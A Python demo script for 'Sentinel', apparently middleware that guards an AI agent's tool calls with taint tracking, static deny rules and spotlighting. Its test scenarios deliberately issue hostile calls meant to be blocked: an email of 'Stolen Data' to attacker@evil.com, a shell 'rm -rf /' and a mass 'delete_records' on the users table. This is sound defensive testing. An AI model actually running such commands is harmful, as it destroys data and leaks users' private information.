"""
Sentinel Full Demo - Enterprise Tool Security

Demonstrates:
1. Session establishment with HMAC-signed session IDs
2. Tool discovery
3. Safe tool execution (always allowed)
4. PII source access (allowed, but adds taint)
5. External sink blocked after PII access (taint enforcement)
6. Administrative tool blocked (static deny)
7. Spotlighting on all tool outputs
"""
import sys
import os
import asyncio
import logging

# Add project root to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sentinel_sdk import Sentinel

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)-7s | %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger("SentinelDemo")

# Configuration - Use relative paths, resolved at runtime
POLICY_PATH = os.path.join(os.path.dirname(__file__), "enterprise_policy.yaml")
MOCK_TOOLS_PATH = os.path.join(os.path.dirname(__file__), "mock_tools.py")


def print_section(title: str):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}\n")


def print_result(tool: str, result: dict, expected_behavior: str):
    """Pretty-print tool execution result."""
    print(f"[OK] Tool: {tool}")
    print(f"     Expected: {expected_behavior}")
    
    if "content" in result:
        text = result["content"][0].get("text", "")
        # Check for spotlighting
        if "<<<SENTINEL_DATA" in text:
            print(f"     Spotlighted: YES")
            # Extract inner content for display
            lines = text.split('\n')
            inner = '\n'.join(lines[1:-1]) if len(lines) > 2 else text
            print(f"     Content: {inner[:100]}{'...' if len(inner) > 100 else ''}")
        else:
            print(f"     Content: {text[:100]}{'...' if len(text) > 100 else ''}")
    print()


def print_blocked(tool: str, error: str, expected_behavior: str):
    """Pretty-print blocked tool call."""
    print(f"[BLOCKED] Tool: {tool}")
    print(f"          Expected: {expected_behavior}")
    print(f"          Reason: {error}")
    print()


async def run_demo():
    print_section("SENTINEL SECURITY MIDDLEWARE DEMO")
    
    # Verify policy file exists
    if not os.path.exists(POLICY_PATH):
        logger.error(f"Policy file not found: {POLICY_PATH}")
        return
    if not os.path.exists(MOCK_TOOLS_PATH):
        logger.error(f"Mock tools not found: {MOCK_TOOLS_PATH}")
        return
    
    logger.info(f"Policy: {POLICY_PATH}")
    logger.info(f"Tools:  {MOCK_TOOLS_PATH}")
    
    # Use Sentinel.start() API - binary discovered automatically
    upstream_cmd = f"{sys.executable} {MOCK_TOOLS_PATH}"
    
    try:
        client = Sentinel.start(
            upstream=upstream_cmd,
            policy=POLICY_PATH,
            security_level="high"
        )
    except FileNotFoundError as e:
        logger.error(f"Failed to start Sentinel: {e}")
        logger.error("Set SENTINEL_BINARY_PATH environment variable to the sentinel-interceptor binary path")
        return
    
    # Track verification results
    verification = {
        "session_hmac": False,
        "static_allow": False,
        "static_deny": False,
        "taint_tracking": False,
        "exfil_prevention": False,
        "spotlighting": False,
    }
    
    async with client:
        print_section("SESSION ESTABLISHED")
        
        # VERIFY: HMAC-signed session ID
        session_id = client.session_id
        if session_id and session_id.count('.') == 2:
            parts = session_id.split('.')
            # Version.UUID.Signature format
            if parts[0] == "1" and len(parts[1]) > 10 and len(parts[2]) > 20:
                verification["session_hmac"] = True
                logger.info(f"Session ID: {session_id}")
                logger.info(f"  Format: version={parts[0]}, uuid_b64={parts[1][:8]}..., sig_b64={parts[2][:8]}...")
        
        # =====================================================================
        # TOOL DISCOVERY
        # =====================================================================
        print_section("TOOL DISCOVERY")
        tools = await client.get_tools_config()
        logger.info(f"Discovered {len(tools)} tools:")
        for t in tools:
            print(f"   - {t['name']}: {t.get('description', '')[:50]}...")
        
        # =====================================================================
        # SCENARIO 1: Safe Operations (Always Allowed)
        # =====================================================================
        print_section("SCENARIO 1: Safe Operations")
        
        result = await client.execute_tool("get_current_time", {})
        text = result.get("content", [{}])[0].get("text", "")
        
        # VERIFY: Spotlighting
        if "<<<SENTINEL_DATA_START:" in text and "<<<SENTINEL_DATA_END:" in text:
            verification["spotlighting"] = True
        
        # VERIFY: Static ALLOW
        if text and "SENTINEL_DATA" in text:
            verification["static_allow"] = True
        
        print_result("get_current_time", result, "ALLOWED (safe operation)")
        
        result = await client.execute_tool("calculate", {"expression": "2 + 2 * 10"})
        print_result("calculate", result, "ALLOWED (safe operation)")
        
        # =====================================================================
        # SCENARIO 2: PII Access (Allowed, Adds Taint)
        # =====================================================================
        print_section("SCENARIO 2: PII Data Access")
        
        pii_result = await client.execute_tool("get_user_profile", {"user_id": "12345"})
        pii_text = pii_result.get("content", [{}])[0].get("text", "")
        
        # Tool allowed = taint tracking is working (source access recorded)
        if pii_text and "alice" in pii_text.lower():
            verification["taint_tracking"] = True
        
        print_result("get_user_profile", pii_result, "ALLOWED (adds PII taint)")
        
        # =====================================================================
        # SCENARIO 3: External Sink After PII (Should be Blocked by Taint)
        # =====================================================================
        print_section("SCENARIO 3: Data Exfiltration Attempt")
        
        exfil_blocked = False
        try:
            await client.execute_tool("send_email", {
                "to": "attacker@evil.com",
                "subject": "Stolen Data",
                "body": "Here's the PII..."
            })
            print_blocked("send_email", "UNEXPECTED: Should have been blocked!", "BLOCKED (PII taint)")
        except RuntimeError as e:
            error_msg = str(e)
            if "PII" in error_msg or "accessing" in error_msg.lower():
                exfil_blocked = True
            print_blocked("send_email", error_msg, "BLOCKED (PII taint)")
        
        try:
            await client.execute_tool("post_to_slack", {
                "channel": "general",
                "message": "Check this out..."
            })
            print_blocked("post_to_slack", "UNEXPECTED: Should have been blocked!", "BLOCKED (PII/INTERNAL_DATA taint)")
        except RuntimeError as e:
            error_msg = str(e)
            if "sensitive" in error_msg.lower() or "PII" in error_msg:
                exfil_blocked = True
            print_blocked("post_to_slack", error_msg, "BLOCKED (PII taint)")
        
        # VERIFY: Exfiltration prevention
        if exfil_blocked:
            verification["exfil_prevention"] = True
        
        # =====================================================================
        # SCENARIO 4: Administrative Tools (Static Deny)
        # =====================================================================
        print_section("SCENARIO 4: Privileged Operations")
        
        static_deny_works = False
        try:
            await client.execute_tool("execute_shell", {"command": "rm -rf /"})
            print_blocked("execute_shell", "UNEXPECTED: Should have been blocked!", "BLOCKED (static deny)")
        except RuntimeError as e:
            error_msg = str(e)
            if "forbidden by static policy" in error_msg:
                static_deny_works = True
            print_blocked("execute_shell", error_msg, "BLOCKED (static deny)")
        
        try:
            await client.execute_tool("delete_records", {"table": "users", "condition": "1=1"})
            print_blocked("delete_records", "UNEXPECTED: Should have been blocked!", "BLOCKED (static deny)")
        except RuntimeError as e:
            error_msg = str(e)
            if "forbidden by static policy" in error_msg:
                static_deny_works = True
            print_blocked("delete_records", error_msg, "BLOCKED (static deny)")
        
        # VERIFY: Static deny
        if static_deny_works:
            verification["static_deny"] = True
        
        # =====================================================================
        # VERIFICATION SUMMARY
        # =====================================================================
        print_section("VERIFICATION RESULTS")
        
        checks = [
            ("HMAC-signed session IDs", verification["session_hmac"], 
             f"Session format validated: 1.uuid.signature"),
            ("Static ALLOW policy", verification["static_allow"],
             "get_current_time, calculate executed successfully"),
            ("Static DENY policy", verification["static_deny"],
             "execute_shell, delete_records blocked with 'forbidden by static policy'"),
            ("Dynamic taint tracking", verification["taint_tracking"],
             "get_user_profile returned PII data (taint source)"),
            ("Data exfiltration prevention", verification["exfil_prevention"],
             "send_email, post_to_slack blocked after PII access"),
            ("Spotlighting (prompt injection defense)", verification["spotlighting"],
             "Output wrapped in <<<SENTINEL_DATA_START:xxx>>> delimiters"),
        ]
        
        passed = 0
        failed = 0
        for name, result, evidence in checks:
            status = "[PASS]" if result else "[FAIL]"
            print(f"{status} {name}")
            if result:
                print(f"       Evidence: {evidence}")
                passed += 1
            else:
                print(f"       MISSING: {evidence}")
                failed += 1
        
        print(f"\n{'='*60}")
        print(f"  TOTAL: {passed}/{len(checks)} features verified")
        print(f"{'='*60}")
        
        # Process isolation note (cannot be verified in-process)
        print("\nNote: Process isolation (Windows Job Objects) verified by code inspection:")
        print("  - See sentinel_middleware/src/mcp/process.rs")
        print("  - Job Object created with limit_kill_on_job_close()")
        print("  - Child process assigned to Job on spawn")


if __name__ == "__main__":
    asyncio.run(run_demo())

